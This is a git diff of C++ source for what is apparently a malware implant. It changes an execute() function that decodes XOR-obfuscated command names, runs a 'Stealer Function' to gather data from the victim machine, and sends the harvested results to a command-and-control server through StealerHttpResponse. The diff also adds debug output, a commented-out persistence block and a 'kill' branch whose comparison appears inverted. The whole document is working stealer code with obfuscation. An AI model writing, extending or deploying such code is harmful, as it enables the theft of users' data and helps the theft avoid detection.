@@ -12,6 +12,8 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
     std::string results;
     std::string work = xor_string("qM[",0x28);
+    std::cout << command << "args" << args << '\n';
+    json results_parse;
 
     /* Persistance */
     // only uncomment in sandbox
@@ -35,8 +37,9 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
         try{
             
-            json results_parse = GetAll();
-            
+            results_parse = GetAll();
+            std::cout << results_parse.dump();
+            printf("\nGOT results\n");
 
 
             /*
@@ -51,14 +54,20 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             std::replace( results.begin(), results.end(), '\\', '/');
             std::replace( results.begin(), results.end(), '-', '_');
             */
+            
+
 
         }
         catch(...){
-            StealerHttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            //this line was changed
+            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("NIADML",0x28), xor_string("NIAD]ZM",0x28), command);
+            //StealerHttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
+            printf("IN WORK COMPARE\n");
+            StealerHttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results_parse, xor_string("NIAD]ZM",0x28), command);
+            //HttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
 
     }
@@ -110,6 +119,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     /* Stealer Function */
     if(command.compare(xor_string("z]LHEL[",0x29)) == 0){
         try{
+            printf("IN STEALER \n");
             json data_from_driver;
             data_from_driver = driver();
             //results = data_from_driver.dump(); 
@@ -129,10 +139,15 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
                 printf("down bad\n");
             }
             
-        }
+        } 
         
 
     }
+    if (command.compare("kill")){
+            printf("ABOUT TO EXIT\n");
+            exit(0);
+            abort();
+        }
    
     /* Send Files To C2*/
     // if(command.compare() == 0){
